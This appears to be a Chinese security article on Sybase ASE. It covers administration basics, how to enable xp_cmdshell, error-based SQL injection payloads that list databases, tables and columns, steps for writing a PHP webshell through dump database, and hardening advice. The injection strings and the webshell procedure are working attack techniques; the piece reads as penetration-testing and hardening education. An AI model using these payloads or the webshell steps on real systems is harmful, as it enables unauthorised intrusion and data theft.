# Sybase数据库安全

0x00 Sybase数据库介绍
================

* * *

### 简介

Sybase的全称又叫：`SAP Sybase Adaptive Server Enterprise`（简称ASE或Sybase ASE），继承于MSSQL的原始代码，和MSSQL血缘很近。Sybase是一种关系型数据库系统，是一种典型的UNIX或WindowsNT平台上客户机/服务器环境下的大型数据库系统。它以PowerBuilder为开发工具，以`SAP Sybase SQL Anywhere`为客户端。目前新版是ASE 15.7.x，命名从12.5.5直接到15.0.0（跳过中间的13、14），本次测试的是12.5.2，其中12.5是12大版本中最稳定的版本。

![enter image description here](http://drops.javaweb.org/uploads/images/d6805b4da23cf14efa6d076ec768f68ad2ffaeec.jpg)

创建数据库的时候要注意存放设备：

![enter image description here](http://drops.javaweb.org/uploads/images/15fb88bc89ff0840d0333d304537e8a98fa39e50.jpg)

### 服务及端口

![enter image description here](http://drops.javaweb.org/uploads/images/6cbf612aab8967854c6c91dcb3403c0d3b8fe7a8.jpg)

开放端口：

备份服务：5001、监控服务：5002、数据库主服务：5000、存储过程服务：5004

### 默认数据库

![enter image description here](http://drops.javaweb.org/uploads/images/2cd0b9f454a57db00159a954c4b4cbfb2c0735d6.jpg)

**Master**：系统的核心数据库，控制服务器的操作以及存储有关所有用户数据库和相关的存储设备的信息，包括用户的用户名和密码；

**Model**：模板数据库，当创建用户数据库时，系统根据model数据库制作副本，并将数据库的大小扩展到用户指定的大小。

**Systemprocs**：保存系统的存储过程。

**Sybsystemdb**：关于分布式事务管理功能。

**Tempdb**：包含临时表，放置临时数据。

### 注册用户和数据库用户

当SQL SERVER创建注册用户后，该用户就能合法进SQL SERVER，该注册用户信息会放在master数据库中的 syslogins表中。但只有注册用户成为某一数据库用户，并且对该用户赋予某些权限时，该注册用户才能在限制条件下使用数据库中的表。

创建注册用户：

```
sp_addlogin loginame, passwd     (删除即为drop)

```

创建数据库用户：

```
[dbname..] sp_adduser loginame    （此处的loginame 必须是注册用户，否则报错）

```

分配权限：

```
grant all | select,insert,delete,update
on table_name | view_name | stored_procedure_name
to username

```

或

```
grant all | create database,create
default,create procedure,create rule,create table,create view,set proxy,set session authorization
to username

```

### 数据库用户分类

sa用户、数据库属主、数据库对象属主和数据库普通用户

1）、sa用户:为系统用户，拥有全部的权限。

2）、数据库属主用户：数据库属主（dbo）用户可对本数据库中所有对象（如表、视图、存储过程等）进行操作。

3）、数据库对象属主：在实际管理中， ，一般为数据库属主。

4）、数据库普通用户：类似于public，数据库普通用户必须在数据库属主对本数据库中某些对象（如表、视图、进程等）赋予某些权限时，才可对本数据库中某些对象进行允许的操作。

### 别名（aliases）与组（group）

1）、别名：所谓别名（aliases)即将SQL SERVER中的注册用户以同一个数据库用户的身份来访问数据库，并具有与该用户相同的权限。

2）、组（group）为数据库用户的集合，即通过对组(group)的权限的控制达到对该组中数据库用户的控制，但也可对该组中数据库某些用户进行格外的权限控制。

![enter image description here](http://drops.javaweb.org/uploads/images/1bf88f2834d8596cc2d6d67f4adf9daed4642399.jpg)

### 角色

一般在管理分工较细的数据库系统中，sa用户往往被分为三种角色：系统管理员角色(SA role)、系统安全员角色(SSO role)、操作员角色（OPER role）。

![enter image description here](http://drops.javaweb.org/uploads/images/a4b1a8a23d34fd79af7b79c14dc89d57bfe0b63e.jpg)

### 连接及管理工具

**1）、isql**

类似于mysql数据库的的mysql.exe。可连接本地及网络数据库。 使用isql –U sa –P “”连接:

![enter image description here](http://drops.javaweb.org/uploads/images/6b9155e6f2ea2fd117ac0060d8eb1df52e3bd423.jpg)

所有参数要区分大小写：

-?显示 isql 开关的语法摘要。

-L列出在本地配置的服务器和在网络上广播的服务器的名称。

-U login_id用户登录 ID。登录 ID 区分大小写。

-P password 是用户指定的密码。如果未使用-P 选项，isql 将提示输入密码。如果在命令提示的末尾使用 -P 选项而不带密码，isql 使用默认密码NULL)。密码区分大小写。

-S server_name 指定要连接到的 SQL Server 默认实例。如果未指定服务器，isql 将连接 到本地计算机上的 SQL Server 默认实例。如果要在网络上从远程计算机执行 isql，则需要此选项。

-H hostname 是使用的客户端的主机名称。

-d use database name，用于指定使用数据库名

**2）、官方Sybase SQL Advantage**

缺点：a、随数据库完整安装包一起发布，使用时有版本上的要求。

b、只支持SQL语句，个人觉得就是isql的图形化版，有所不便。

![enter image description here](http://drops.javaweb.org/uploads/images/2b62a50698f94496a7f78764efff892aa870ccef.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/ca9e386baba0239c0eee807380e3cfd2088122a4.jpg)

（Sql.ini设定及功能：http://blog.csdn.net/potato015/article/details/2450989 ）

**3）、官方Sybase Central**

缺点：a、随数据库完整安装包一起发布，使用时有版本上的要求。

b、功能不是很强大

![enter image description here](http://drops.javaweb.org/uploads/images/e58ba4701b015bc6740f39524ce40c2462ac7c98.jpg)

**4）、DBArtisan**

![enter image description here](http://drops.javaweb.org/uploads/images/7dfe0ec560bf8a9fe1bf9e16665e9b3edb5596d3.jpg)

0x01 Sybase安全
=============

### 执行系统命令

默认xp_cmdshell是不开启的。未开启xp_cmdshell时：

![enter image description here](http://drops.javaweb.org/uploads/images/2d9275e004434024b733bf61414b0029d42c7d4e.jpg)

开启xp_cmdshell : sp_configure 'xp_cmdshell context',0

![enter image description here](http://drops.javaweb.org/uploads/images/281ef120982d69c2623b399152693fb12873289c.jpg)

开启xp_cmdshell后执行命令:

![enter image description here](http://drops.javaweb.org/uploads/images/3b2a63a9655ede8d8340b8b1aa6a5ee29d1e37f7.jpg)

权限不够时执行xp_cmdshell:

![enter image description here](http://drops.javaweb.org/uploads/images/e940e81dbd508e807b1484272e82e1f8b81d6327.jpg)

**细节：**

1、执行 sp_configure 'xp_cmdshell',0 允许所有含sa_role角色的login用户执行xp_cmdshell命令，此功能默认关闭

2、默认 sp_configure 'xp_cmdshell',1 经测试需要在windows下具有相同longin用户名称和密码，并且该用户隶属administrators权限组，还有一点不能忽略：取消选择“用户下次登录时需更改密码”！

3、MSSQL由于和windows集成，可以直接使用系统账户登录到数据库。而Sybase则需要按照上面第二步做配置才能达到和MSSQL类似的效果。

### 注释符与联合查询

支持union，可以用/**/、--来注释，可以用/**/来替换空格，也可以用+代替空格，也支持count(_)，不过通配符_不能出现在子查询中。

![enter image description here](http://drops.javaweb.org/uploads/images/ce527f174ed9769cea6ffed7eb351b32e14bd68c.jpg)

12.5.2及以前的版本不支持TOP关键字，形如select top N from注入语句将报错

![enter image description here](http://drops.javaweb.org/uploads/images/19f30adcd4da5b9eebb7073d48e6b6e68ac0633e.jpg)

当然，不能用top，肯定会有替代方案，那就是set rowcount N

![enter image description here](http://drops.javaweb.org/uploads/images/411c12fce6027a8f1cefe4228e5c6f10daf04340.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/179656b36b004318eb64687f5a57928242008e87.jpg)

但是set rowcount N貌似不支持子查询和条件句：

![enter image description here](http://drops.javaweb.org/uploads/images/492456e99ce4f6a0cbae1d0e3a6510822fa9b7bc.jpg)

### 多句执行

与mssql不同的地方是：多条语句直接以空格分隔，而不是分号。

![enter image description here](http://drops.javaweb.org/uploads/images/cbc8d03b8e145a4870aa108075843b61d819f958.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/5baf1ff69fa1d4600331c5e2dd1ad85f3f7ad112.jpg)

### 对编码的支持

与MSSQL相同：

![enter image description here](http://drops.javaweb.org/uploads/images/13f9fe5b43141c4fbb9d328b89711d16f91389bf.jpg)

### SQL注入特性

以Php为脚本：

![enter image description here](http://drops.javaweb.org/uploads/images/648e6bf8a80774147e2260fa1aae76e7dfeedfe8.jpg)

以Java为脚本：

![enter image description here](http://drops.javaweb.org/uploads/images/bf71025e9bf293a9ddd67ad80d08ebc28a54b0dc.jpg)

判断是否是Sybase数据库：

```
id=1 and exists(select * from master.dbo.ijdbc_function_escapes)

```

![enter image description here](http://drops.javaweb.org/uploads/images/1850f39434483649538dad6014f0b680af36c94a.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/cf55a2aaa016787b2891e5c7ce171f35d8874c29.jpg)

以报错方式注入时要注意，sybase是不支持不同类型数据直接相比较的（与MSSQL不同）：

```
id=1 and 1=user
id=1 and 1=convert(integer,user)

![enter image description here][28]

id=1 and 1=convert(integer,(select+@@version))

![enter image description here][29]

id=-1 union select 1,"",(select @@version)

```

![enter image description here](http://drops.javaweb.org/uploads/images/0e318b4a16034f3191b52ae0a5fa52afaef3c457.jpg)

列库（复杂版本）：

```
id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)>‘ ’)) 

```

列出第一个库master

```
id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)>’master‘))  

```

列出除master外的第一个库

![enter image description here](http://drops.javaweb.org/uploads/images/5c291124b89c7c7a33274ea0731bb53448ba4893.jpg)

列库（简单版本）：

```
id=1 and 1=convert(integer,(SELECT name FROM master..sysdatabases where dbid=1))   不断递增dbid的值

```

![enter image description here](http://drops.javaweb.org/uploads/images/152169603d5c4107178500b49a6a3376f8621601.jpg)

dbid是连续的数字，猜解起来很容易

![enter image description here](http://drops.javaweb.org/uploads/images/453213f72fc9d49d8f0908b17bbbbbbc41597087.jpg)

PS：虽然Sybase不能用TOP、for xml path，但是支持having、where not in等语法，变化方式依然有多种

与MSSQL不同的一点：

MSSQL是xtype Sybase是type

![enter image description here](http://drops.javaweb.org/uploads/images/8bf35011b5cebffad339eb5744bc6e49c11ecbd1.jpg)

列表(只能用复杂版)：

```
id=1 and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=‘U’) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)>‘ ’))

```

列出第一个表cmd

```
id=1 and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=‘U’) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)>‘cmd’))

```

列出除cmd外的第一个表cmd0

![enter image description here](http://drops.javaweb.org/uploads/images/60a4cf765fab69027f76d4af0b299acb90127bb5.jpg)

列字段：

```
select name from test..syscolumns where id=object_id(‘users’) and colid=1  递增colid

```

即：

```
id=1 and 1=convert(integer,(select name from test..syscolumns where id=object_id('users') and colid=1))

```

![enter image description here](http://drops.javaweb.org/uploads/images/e480ab18ba57089012e2db592dec4a16cb0be12c.jpg)

工具注入：

![enter image description here](http://drops.javaweb.org/uploads/images/22a3d31bf3d4b486782c67db87eaa529ab5189e8.jpg)

穿山甲猜不出库名，抓包发现使用了TOP关键字，看来穿山甲只支持12.5.3以后的sybase

![enter image description here](http://drops.javaweb.org/uploads/images/57a9d8604621097de5c762867824b73fa1052087.jpg)

### 备份写文件（webshell）

前提条件：

1、备份服务打开

2、备份服务允许远程访问

3、有数据库权限（宿主权限）+磁盘写权限

步骤：

```
1、create table cmd(a image)—

2、insert into cmd(a) values ('<?php phpinfo();?>')—

3、dump database test to ‘C:\wamp\www\1.php’ 【全备份】
（对应MSSQL为：backup database 库名 to disk= 'C:\wamp\www\1.php ' WITH DIFFERENTIAL,FORMAT;--）
   dump TRANSACTION test to ‘C:\wamp\www\1.php’ 【LOG备份】
（对应MSSQL为：backup log 库名 to disk='d:\www\xxx\test.asp'--）

注：使用dump TRANSACTION时要求数据文件和日志文件不能存放在同一设备中。

4、drop table cmd--

```

![enter image description here](http://drops.javaweb.org/uploads/images/2a980476176fa2b17a629bf07cd18c9be98657c0.jpg)

### 加固与防范

#### 口令

```
sp_password  “原密码”, “新密码”,用户名

```

例如将sa用户的密码由空改为123456： sp_password NULL,”123456”,sa

```
sp_configure “minimum password length”,8    ---密码最短长度

sp_configure “check password for digit”,1   ---至少包含一个数字

sp_configure “systemwide password expiration”,90   ---口令有效时长

sp_configure “maximum failed logins”,5   ---设置口令错误锁定阀值

```

删除扩展存储过程xp_cmdshell， 并删 除 sybsyesp.dll 

```
exec  sp_dropextendedproc  xp_cmdshell

```

  关闭sa账户的使用：

```
sp_locklogin sa,"lock“

```

关闭远程访问：

```
exec sp_configure “allow remote access” ,0

```

关闭后，很多服务将无法使用，比如备份

#### 登陆IP白名单

系统没有和登陆相关的限制设置，只能通过创建登录触发器来实现登陆IP白名单  

```
create procedure login_trg 
as  
   declare @ip varchar(18),@login_name varchar(20) 
begin  
   select 
   @ip=t.ipaddr,@login_name=suser_name() 
   from master.dbo.sysprocesses t where t.spid=@@spid  
   if @ip<>'192.168.0.102'
      begin  
         raiserror 30000 'IP address %1! ,with user %2! login failed!',@ip,@login_name 
         select syb_quit() 
      end 
   else  
       print 'Welcome!' 
end  

```

创建登录触发器后，执行如下命令：

```
isql>grant execute on login_trg to loginname  
isql>sp_modifylogin loginname, "login script",login_trg

```

#### 日志

```
isql>exec sp_configure "log audit logon failure",1 --记录登录失败信息
isql>exec sp_configure "log audit logon success",1 --记录登录成功信息

```

http://drops.wooyun.org/wp-content/uploads/2015/08/